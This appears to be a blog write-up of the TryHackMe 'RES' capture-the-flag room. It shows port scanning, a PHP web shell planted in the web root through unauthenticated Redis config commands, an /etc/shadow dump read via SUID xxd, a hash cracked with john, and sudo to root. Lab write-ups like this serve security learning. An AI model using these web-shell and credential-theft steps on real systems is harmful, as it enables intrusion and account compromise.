---
image: /assets/img/res/res.png
layout: post
title: RES
date: 2020-10-12 00:00:01 +5:30
categories: [tryhackme, Easy]
tags: [TryHackMe,redis,shell] # add tag
---
## Summary

>There are two ports open 80,6379<br />
>Redis Server have unauth access.<br />
>We can upload a php shell and get access<br />
>XXD suid to read /etc/shadow<br />
>Crack the hash and get password<br />
>User can sudo as root

## Walkthrough

### Enumeration

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/argenestel/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.79.132:80
Open 10.10.79.132:6379
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 80,6379 10.10.79.132

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 09:13 IST
Initiating Ping Scan at 09:13
Scanning 10.10.79.132 [2 ports]
Completed Ping Scan at 09:13, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:13
Completed Parallel DNS resolution of 1 host. at 09:13, 0.17s elapsed
DNS resolution of 1 IPs took 0.18s. Mode: Async [#: 2, OK: 0, NX: 0, DR: 1, SF: 4, TR: 4, CN: 0]
Initiating Connect Scan at 09:13
Scanning 10.10.79.132 [2 ports]
Discovered open port 80/tcp on 10.10.79.132
Discovered open port 6379/tcp on 10.10.79.132
Completed Connect Scan at 09:13, 0.25s elapsed (2 total ports)
Nmap scan report for 10.10.79.132
Host is up, received syn-ack (0.26s latency).
Scanned at 2020-10-12 09:13:45 IST for 1s

PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack
6379/tcp open  redis   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
```

#### Port 80

So we can see apache default page
![port](/assets/img/res/port80.png)

#### Redis 6379

```bash
argenestel@parrot  ~/Desktop/tryhackme/res  nano shell.php
argenestel@parrot  ~/Desktop/tryhackme/res  cat shell.php
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
argenestel@parrot  ~/Desktop/tryhackme/res  cat shell.php | redis-cli -h 10.10.79.132 -x set lkey

OK
argenestel@parrot  ~/Desktop/tryhackme/res  redis-cli -h 10.10.79.132
10.10.79.132:6379> get lkey
"<?php echo shell_exec($_GET['e'].' 2>&1'); ?>\n"
10.10.79.132:6379> config set dir /var/www/html/
OK
10.10.79.132:6379> config set dbfilename "shell.php"
OK
10.10.79.132:6379> config get dbfilename
1) "dbfilename"
2) "shell.php"
10.10.79.132:6379> save
OK
10.10.79.132:6379>
```

![shell](/assets/img/res/shell.png)
So we successfully uploaded php shell

![reverseshell](/assets/img/res/reverse.png)

### PrivEsc

![suidbits](/assets/img/res/suid.png)

```bash
www-data@ubuntu:/home/vianka$ LFILE=/etc/shadow
www-data@ubuntu:/home/vianka$ xxd "$LFILE" | xxd -r
root:!:18507:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18506:0:99999:7:::
uuidd:*:18506:0:99999:7:::
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```

```bash
Argenestel@parrot  ~/Desktop/tryhackme/res  john --wordlist=/usr/share/wordlists/rockyou.txt vianka.hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<redacted>       (?)
1g 0:00:00:03 DONE (2020-10-12 14:44) 0.3184g/s 407.6p/s 407.6c/s 407.6C/s kucing..poohbear1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
www-data@ubuntu:/home/vianka$ su vianka
Password:
vianka@ubuntu:~$ sudo -l
[sudo] password for vianka:
Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
vianka@ubuntu:~$ sudo -i
```

Rooted :)
